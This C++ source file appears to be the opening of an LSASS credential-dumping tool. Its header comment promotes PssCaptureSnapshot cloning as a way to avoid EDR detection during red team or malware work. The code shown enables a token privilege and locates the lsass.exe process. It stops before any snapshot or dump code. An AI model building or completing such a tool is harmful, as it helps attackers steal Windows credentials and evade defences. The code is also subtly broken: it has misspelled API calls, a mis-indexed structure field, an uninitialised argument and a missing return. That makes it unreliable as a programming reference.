/*
   The Local Security Authority Subsystem Service (LSASS) on Windows is a primary target
   during red team operations and malware development due to the sensitive credentials it
   stores in memory. Traditional techniques like using MiniDumpWriteDump directly on LSASS
   are often blocked or detected by Endpoint Detection and Response (EDR) systems.

  To bypass this, attackers use snapshot-based dumping with the Windows API
  PssCaptureSnapshot introduced in Windows 8.1 and Server 2012 R2. This technique allows
  creating a memory clone of LSASS, which can be dumped without directly accessing the 
  original process during memory capture — thereby reducing detection surface.
*/

#include<Windows.h>
#include<TlHelp32.h>
#include<ProcessSnapshot.h>
#include<iostream>
#include<DbgHelp.h>

#pragma comment(lib,"dbghelp32.lib")
#pragma comment(lib,"kernel32.lib")

bool EnablePrivilege(LPCWSTR privName){
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
        return false;
    if(!LookUpPrivilegeValue(NULL,privName,&luid))
        return false;
    tp.PrivilegeCount = 1;
    tp.PrivilegeCount[0].Luid = luid;
    tp.Privileges[0].Attributes =  SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
}
DWORD GetLsassPID(){
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,entry.th32ProcessID);
    if(Process32First(snapshot,&entry)){
        do{
            if(_wcsicmp(entry.szExeFile,L"lsass.exe") == 0){
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }while(Process32Next(snapshot,&entry));
    }
    CloseHandle(snapshot);
}
